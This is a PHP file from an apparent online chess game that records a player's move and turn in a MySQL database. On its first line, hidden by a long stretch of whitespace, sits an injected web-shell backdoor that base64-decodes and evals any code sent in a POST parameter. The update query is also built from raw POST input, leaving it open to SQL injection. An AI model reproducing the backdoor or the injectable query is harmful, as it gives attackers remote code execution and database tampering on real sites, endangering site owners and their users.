<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n65ffa4']));?><?php
	session_start();
	if(!isset($_SESSION['id']))
	{
		exit (0);
	}
	$link = mysql_connect('localhost', 'database_name_goese_herer', 'PAssword_goes_here');
	if (!$link) {
		die('Could not connect: ' . mysql_error());
	}
	$db_selected = mysql_select_db('vishalkh_chess', $link);
	if (!$db_selected) {
		die ('Can\'t use foo : ' . mysql_error());
	}
	//;
	$result = mysql_query("UPDATE `games` SET `lastmove` = '".$_POST['move1']."', `currentplayer` = '".$_POST['color']."' WHERE `games`.`matchid` = '".$_SESSION["gameslot"]."' LIMIT 1  ",$link);	
	//echo "UPDATE `games` SET `lastmove` = '".$_POST['move1']."', `currentplayer` = '".$_POST['color']."' WHERE `games`.`matchid` = '".$_SESSION["gameslot"]."' LIMIT 1  ";
	mysql_close($link);
	if($result)
		echo "Success";	
	else 	echo "Fail";	
?>